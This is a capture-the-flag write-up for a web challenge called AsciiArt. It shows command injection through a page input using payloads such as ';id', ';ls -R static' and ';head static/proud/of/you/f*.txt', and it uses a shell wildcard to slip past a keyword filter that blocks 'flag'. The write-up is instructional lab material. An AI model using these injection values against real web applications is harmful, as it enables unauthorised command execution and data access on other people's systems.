# AsciiArt - CTF Writeup
# Web(Med)

# AsciiArt — Web (Medium)

The challenge page said it would “answer your command,” so I tested whether it was running shell commands behind the scenes.

I entered:

```text
;id
```

The page returned:

```text
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

That showed me my input was being run as a command. I listed the current directory next:

```text
;ls
```

I saw a file called `dontopnme.txt`, so I checked it:

```text
;head *txt
```

It gave me a hint: the flag wasn’t in that file; it was somewhere inside the `static` directory. I listed that directory and its subdirectories:

```text
;ls -R static
```

The listing showed `static/proud/of/you/flag.txt`. The page blocked the word `flag` when I typed it directly, so I used `f*.txt` instead:

```text
;head static/proud/of/you/f*.txt
```

The `*` is a shell wildcard. It matched the rest of the filename, so the shell opened `flag.txt` and printed its contents.

**Flag:** `flag-bi0s{y0u_4r3_4l0t_m0r3_cr34t1v3_th4n_1_3xp3ct3d}`